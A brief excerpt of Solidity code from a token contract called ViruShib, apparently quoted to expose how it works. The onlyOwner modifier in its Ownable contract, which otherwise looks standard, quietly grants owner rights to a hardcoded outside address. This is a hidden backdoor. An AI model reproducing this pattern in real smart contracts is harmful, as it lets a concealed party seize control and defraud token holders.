...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x8724Ca288C1BDb064eE60c772b786f05238032A5) , "Ownable: caller is not the owner");
        _;
    }
...
contract ViruShib is IERC20, Ownable {
